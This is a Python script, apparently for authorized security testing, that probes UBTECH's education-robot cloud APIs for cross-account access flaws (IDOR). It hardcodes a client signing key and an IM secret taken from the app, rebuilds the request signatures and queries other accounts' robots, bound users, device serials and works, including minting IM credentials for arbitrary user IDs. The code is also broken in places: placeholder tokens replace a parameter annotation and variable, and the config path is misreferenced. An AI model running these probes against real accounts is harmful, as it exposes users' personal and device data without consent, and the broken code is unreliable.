#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
idor_probe.py — UBTECH 悟空教育版云端 API 双账号交叉越权（IDOR）检测脚本

授权边界（务必遵守）：
  * 只允许使用【你自己注册/持有的两个测试账号】互测：
    账号 A 扮演"攻击者"，账号 B 扮演"受害者"（两者都是你自己的）。
  * 基线模式（--baseline）：A 访问 A 自己的对象，验证请求格式正确。
  * 交叉模式（--cross）：A 的 token 访问 B 的对象 ID。
      返回 200 且带 B 的数据  => 越权坐实（服务端缺对象级校验）
      返回 403/错误           => 服务端有校验（好事）
  * 严禁将本脚本指向任何非本人所有的账号 / 机器人 / SN / 对象 ID。
  * 全部探针为只读查询；写操作端点（unbind / restoreSettings /
    permission/update / registerRobot / deleteUserData）一律不在自动测试范围。

依赖：requests  (pip install requests)
用法：
  1. 复制 config.example.json 为 config.json，填入两个自有账号的信息
  2. python idor_probe.py --baseline     # 先跑基线，全部成功才说明格式对
  3. python idor_probe.py --cross        # 再跑交叉，看哪些接口漏数据
"""

import argparse
import hashlib
import json
import sys
import time
import uuid

try:
    import requests
except ImportError:
    sys.exit("pip install requests")

# ---- 客户端固定签名材料（来自 App BuildConfig，公开 APK 可恢复）----
SIGN_APP_ID = "100020114"
SIGN_APP_KEY = "b4e01f307c614ded9f7ac59cf9960874"

# ---- host 映射（来自 HeaderInterceptor / BuildConfig）----
HOST_INTERNAL = "https://internal.ubtrobot.com/v1/minieducn/"   # alpha2-web 业务
HOST_APIS = "https://apis.ubtrobot.com/"                        # im / user-service / file
HOST_PRODAPI = "https://prodapi.ubtrobot.com/"                  # equipment

IM_CHANNEL = "MINIEDUCN"
IM_SECRET = "IM$SeCrET"   # com/common/channel/security/Auth.java

requests.packages.urllib3.disable_warnings()


def md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def ubt_headers(token: <访问令牌_01>, device_id: str) -> dict:
    """复现 HttpSignInterceptor + URestSigner:
    X-UBT-Sign = md5(ts + appKey + nonce + deviceId) + ' ' + ts + ' ' + nonce + ' v2'
    """
    ts = str(int(time.time()))
    nonce = uuid.uuid4().hex[:8]
    sign = f"{md5(ts + SIGN_APP_KEY + nonce + device_id)} {ts} {nonce} v2"
    return {
        "authorization": <访问令牌_01>,
        "X-UBT-AppId": SIGN_APP_ID,
        "X-UBT-DeviceId": device_id,
        "X-UBT-Sign": sign,
        "Content-Type": "application/json",
    }


def im_params(user_id: str, extra: dict = None) -> dict:
    """复现 Auth.getSignature: signature = md5('IM$SeCrET' + time_ms)"""
    t = str(int(time.time() * 1000))
    p = {
        "signature": md5(IM_SECRET + t),
        "time": t,
        "userId": user_id,
        "channel": IM_CHANNEL,
    }
    if extra:
        p.update(extra)
    return p


def probe(name, method, url, *, headers=None, params=None, body=None, leak_check=None):
    try:
        r = requests.request(method, url, headers=headers, params=params,
                             json=body, timeout=15, verify=False)
    except Exception as e:
        return {"name": name, "url": url, "error": str(e)}
    text = r.text[:600]
    leaked = bool(leak_check and r.status_code == 200 and leak_check in r.text)
    return {"name": name, "url": url, "status": r.status_code,
            "leaked": leaked, "body": text}


def build_probes(cfg, mode):
    """mode: 'baseline' (A->A) 或 'cross' (A->B 的对象)"""
    a = cfg["account_a"]
    src = a if mode == "baseline" else cfg["account_b"]
    # 基线时用自己的对象；交叉时用 B 的对象，但 token 始终是 A 的
    obj = a["objects"] if mode == "baseline" else cfg["account_b"]["objects"]
    h = ubt_headers(a["token"], a["device_id"])
    im_uid = src.get("im_user_id") or obj.get("robot_user_id") or ""

    P = []
    # 1. IM 凭据签发：任意 userId -> userSig（无需账号 token，只验 IM$SeCrET 签名）
    P.append(("im_getInfo_mint_usersig", "GET", HOST_APIS + "im/getInfo",
              {"params": im_params(im_uid), "leak_check": "userSig"}))
    # 2. IM 在线状态预言机（账号存在性/在线探测）
    P.append(("im_isOnline", "GET", HOST_APIS + "im/isOnline",
              {"params": im_params(im_uid, {"accounts": obj.get("robot_user_id", "")}),
               "leak_check": None}))
    # 3. 机器人绑定用户列表（robotUserId -> 主/从账号信息）
    P.append(("relation_getBindUsers", "GET", HOST_INTERNAL + "relation/getBindUsers",
              {"headers": h, "params": {"robotUserId": obj.get("robot_user_id", "")},
               "leak_check": "nickName"}))
    # 4. 机器人从账号列表
    P.append(("relation_getSlaveUsers", "GET", HOST_INTERNAL + "relation/getSlaveUsers",
              {"headers": h, "params": {"robotUserId": obj.get("robot_user_id", "")},
               "leak_check": "userId"}))
    # 5. 权限查询（slaveUserId + robotUserId 均可控）
    P.append(("permission_query", "GET", HOST_INTERNAL + "permission/query",
              {"headers": h, "params": {"slaveUserId": cfg["account_b"].get("user_id", ""),
                                        "robotUserId": obj.get("robot_user_id", "")},
               "leak_check": None}))
    # 6. 设备信息按 SN 查询（prodapi，SN 是关键输入）
    P.append(("equipment_listBySerialNum", "POST", HOST_PRODAPI + "equipment/equipment/listBySerialNum",
              {"headers": h, "body": {"serialNum": obj.get("serial_num", "")},
               "leak_check": "serialNum"}))
    # 7. 作品内容按 opusId 读取
    P.append(("opus_getcontent", "GET", HOST_INTERNAL + "opus/getcontent",
              {"headers": h, "params": {"opusId": obj.get("opus_id", "")},
               "leak_check": None}))
    # 8. 账号扩展信息（token 对应的手机号/邮箱，自查 token 暴露面）
    P.append(("user_account_extra", "GET", HOST_APIS + "user-service-rest/v2/user/account/extra",
              {"headers": h, "params": {"appId": SIGN_APP_ID}, "leak_check": None}))
    # 9. 当前账号机器人列表（基线拿 robotUserId/serialNum 的正规来源）
    P.append(("relation_getRobots", "GET", HOST_INTERNAL + "relation/getRobots",
              {"headers": h, "params": {}, "leak_check": None}))
    return P


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--config", default="config.json")
    ap.add_argument("--baseline", action="store_true", help="A 访问 A 自己的对象（格式自检）")
    ap.add_argument("--cross", action="store_true", help="A 的 token 访问 B 的对象（越权检测）")
    args = ap.parse_args()
    if not (args.baseline or args.cross):
        ap.error("指定 --baseline 或 --cross")

    cfg = json.load(open(ap.config, encoding="utf-8"))
    mode = "baseline" if args.baseline else "cross"
    results = []
    print(f"[*] mode={mode}  token=<访问令牌_01>  对象={'账号A' if mode == 'baseline' else '账号B'}")
    for name, method, url, kw in build_probes(cfg, mode):
        r = probe(name, method, url, **kw)
        results.append(r)
        if "error" in r:
            print(f"  [ERR] {name}: {r['error']}")
        else:
            flag = "  <== 数据泄露!" if r["leaked"] else ""
            print(f"  [{r['status']}] {name}{flag}")
    out = f"result_{mode}_{int(time.time())}.json"
    json.dump(results, open(out, "w", encoding="utf-8"), ensure_ascii=False, indent=2)
    print(f"[*] 明细已写入 {out}")
    if mode == "cross":
        hits = [r["name"] for r in results if r.get("leaked")]
        print(f"[*] 越权命中 {len(hits)} 项: {hits if hits else '无'}")


if __name__ == "__main__":
    main()
